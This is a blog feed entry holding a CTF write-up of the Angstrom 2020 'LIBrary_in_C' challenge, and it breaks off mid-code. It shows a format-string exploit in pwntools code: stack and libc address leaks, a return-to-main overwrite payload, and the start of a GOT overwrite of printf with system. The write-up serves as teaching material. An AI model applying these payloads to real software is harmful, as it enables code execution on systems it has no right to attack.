<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2020-03-22T14:10:55+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Jakub Acsâ€™s Personal Blog</title><subtitle></subtitle><author><name>Jakub Acs</name><email>acsjakub@gmail.com</email></author><entry><title type="html">Angstrom CTF 2020</title><link href="http://0.0.0.0:4000/2020/03/21/AngstromCTF-2020.html" rel="alternate" type="text/html" title="Angstrom CTF 2020" /><published>2020-03-21T00:00:00+00:00</published><updated>2020-03-21T00:00:00+00:00</updated><id>http://0.0.0.0:4000/2020/03/21/AngstromCTF-2020</id><content type="html" xml:base="http://0.0.0.0:4000/2020/03/21/AngstromCTF-2020.html">&lt;p&gt;I recently took part in &lt;a href=&quot;https://2020.angstromctf.com&quot;&gt;Angstrom CTF 2020&lt;/a&gt;, together with my team &lt;a href=&quot;https://dissect.eu&quot;&gt;DISsect@CTU&lt;/a&gt;. As usual, I focused on the &lt;code class=&quot;highlighter-rouge&quot;&gt;pwn&lt;/code&gt; category and I decided to share write-up of the most interesting challenge with you int this blog post. The challenges are still online and working, just like PicoCTF, so I encourage you to go ahead and try them.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h1 id=&quot;library_in_c-write-up&quot;&gt;LIBrary_in_C write-up&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;ctf&lt;/strong&gt;: Angstrom CTF 2020&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;category&lt;/strong&gt;: pwn&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;points&lt;/strong&gt;: 120&lt;/p&gt;

&lt;h2 id=&quot;task&quot;&gt;Task&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;../../../assets/images/2020-03-21-task.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are given a &lt;code class=&quot;highlighter-rouge&quot;&gt;binary&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TLDR;&lt;/h2&gt;

&lt;p&gt;Format string vulnerability to leak &lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; addresses. Overwrite return address to return to &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; for more input opportunities. Overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; GOT with &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and send &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh\x00&lt;/code&gt; as next payload. (Not the easiest way)&lt;/p&gt;

&lt;h2 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h2&gt;

&lt;p&gt;Since we are given source for the file, searching for vulnerability is fairly easy, we can see that we have two opportunities to use format string vulnerability in two vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; calls:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IONBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome to the LIBrary in C!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is your name?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// printf works just like System.out.print in Java right?&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Why hello there &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                            &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;here&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;And what book would you like to check out?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your cart:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                            &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;here&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;That's great and all but uh...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;It turns out this library doesn't actually exist so you'll never get your book.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Have a nice day!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;rabin2&lt;/code&gt; reveals that binary is 64bit, compiled with canaries, but that is not a concern, since with format strings we can cherry pick the addresses we want to write to. Also, the binary does not use position independent code, which discloses the GOT addresses for us.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# rabin2 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; library_in_c
&lt;span class=&quot;nb&quot;&gt;arch     &lt;/span&gt;x86
baddr    0x400000
binsz    6790
bintype  elf
bits     64
canary   &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;class    ELF64
compiler GCC: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 7.4.0
crypto   &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;endian   little
havecode &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;lsyms    &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;os       linux
pcalign  0
pic      &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;relocs   &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;relro    partial
rpath    NONE
sanitiz  &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;static   &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;stripped &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;subsys   linux
va       &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; function determines the number of arguments by the format string argument (by the number of % sequences). It expects the following arguments to be stored on the stack even in the 64bit calling convention. Since our buffer used as the format string for this &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call is also stored on the stack, we can not only print the contents of the stack, but with &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt;, control the destination of our future writes.&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;h3 id=&quot;argument-find&quot;&gt;Argument find&lt;/h3&gt;

&lt;p&gt;In order to exploit this, we first need to find the order of argument, which we can use to refer to the start of our buffer. Since the executable is 64bit, it will take arguments as quad words from the stack. I wrote a simple script which uses &lt;code class=&quot;highlighter-rouge&quot;&gt;glibc&lt;/code&gt;â€™s &lt;code class=&quot;highlighter-rouge&quot;&gt;i$&lt;/code&gt; notation to refer to the &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;-th argument and print it as a hexadecimal quadword:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./library_in_c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'AAAAAAAA &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{i}$p'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{i} =&amp;gt; {s}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 discover.py | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x4141'&lt;/span&gt;
8 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; b&lt;span class=&quot;s1&quot;&gt;'Welcome to the LIBrary in C!\nWhat is your name?\nWhy hello there AAAAAAAA 0x4141414141414141\nAnd what book would you like to check out?\n'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Then I slightly modified it for the second &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 discover.py | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x4141'&lt;/span&gt;
16 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; b&lt;span class=&quot;s2&quot;&gt;&quot;Your cart:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - AAAAAAAA 0x4141414141414141&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;That's great and all but uh...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;It turns out this library doesn't actually exist so you'll never get your book.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Have a nice day!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So now I know, that first quadword(8 bytes) of my buffer is stored as 8th(16th) argument for the first (second) &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call. Next 8 bytes are the 9th(17th) argument. We will use this when overwriting.&lt;/p&gt;

&lt;h3 id=&quot;stack-and-libc-leak&quot;&gt;stack and libc leak&lt;/h3&gt;

&lt;p&gt;In this part I will explain how I leaked the &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt; addreses.&lt;/p&gt;

&lt;p&gt;Our vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; calls are in &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function. Main is initiated from &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt; function, which is a part of &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt;. We will use the fact that the return adress for &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, stored further on the stack, is address to &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt;. This address is stored as 
27th argument for our &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call. I also wanted to leak some reliable &lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt; address. After some debugging, I chose the address corresponding to 24th argument.&lt;/p&gt;

&lt;p&gt;Thus my first payload that leaks addresses looks as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload_leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$p &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%27&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$p'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This payload gets us two addresses that we need to further process to get the ones that we desire. To get the address of system in current process memory, we do the following.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;libc_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__libc_start_main'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;0xf0 is the offset in &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;libc_leak&lt;/code&gt; is the address stored as return address for &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;ret2main&quot;&gt;ret2main&lt;/h3&gt;

&lt;p&gt;At the time I was exploiting this challenge, I didnâ€™t realise I can use one gadget and jmp straight to &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;execve('/bin/sh')&lt;/code&gt;. Thus, I wanted to return to main to give myself another round of format string inputs. To do this, I computed the address where the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;â€™s return address is stored and with second &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call, I wrote &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;â€™s address. This way, after finishing &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, we jump back to &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; again.&lt;/p&gt;

&lt;p&gt;Obtaining the pointer to return address(at stack) for &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, storing it as &lt;code class=&quot;highlighter-rouge&quot;&gt;ret_addr&lt;/code&gt; was done using stack address leaked in previous step and subtracting constant from it (I donâ€™t know where was the leaked address meant to be pointing, but it was a constant offset from &lt;code class=&quot;highlighter-rouge&quot;&gt;ret_addr&lt;/code&gt;, so I used it)&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload_ret2main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%21&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%1799&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%22&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn     '&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload_ret2main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload_ret2main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload_ret2main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Letâ€™s have a look at the payload closer:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
writes 0x00000000 to ret_addr + 4
  |
  |  writes 0x0040 to ret_addr + 2
  |     |
  |     |         writes 0x0747 to ret_addr
  |     |           |
__|__ __|_____ _____|______  ___ &amp;lt;----- rest is padding
%20$n%64s%21$hn%1799s%22$hn     '

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This causes ret_addr now contains &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400747&lt;/code&gt;, which is the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;got-overwrite&quot;&gt;GOT overwrite&lt;/h3&gt;

&lt;p&gt;In previous section I had to write known address to unknown place. This time itâ€™s going to be the other way around. We will be writing the leaked &lt;code class=&quot;highlighter-rouge&quot;&gt;libc_system&lt;/code&gt; address to known &lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt; entry of &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;. I decided to only overwrite the lower 3 bytes, since the higher bytes had to remain the same from &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;. I first wrote the higher byte and then the remaining two as a word.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffff&lt;/span&gt;
